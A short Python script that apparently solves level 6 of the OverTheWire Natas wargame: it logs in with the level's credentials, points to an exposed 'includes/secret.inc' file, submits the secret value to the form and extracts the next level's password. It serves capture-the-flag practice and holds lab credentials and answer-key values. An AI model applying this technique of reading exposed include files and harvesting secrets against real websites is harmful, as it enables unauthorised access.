#!/usr/bin/env python

# Evaluating PHP code to access the websites flag


# import the package requests which is for html information
import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()

# response = session.get(url + "includes/secret.inc",auth = (username, password))

response = session.post(url,data = { "secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit" },auth = (username, password))
content = response.text

# print(content)
# (.*)

print (re.findall("The password for natas7 is (.*)", content)[0])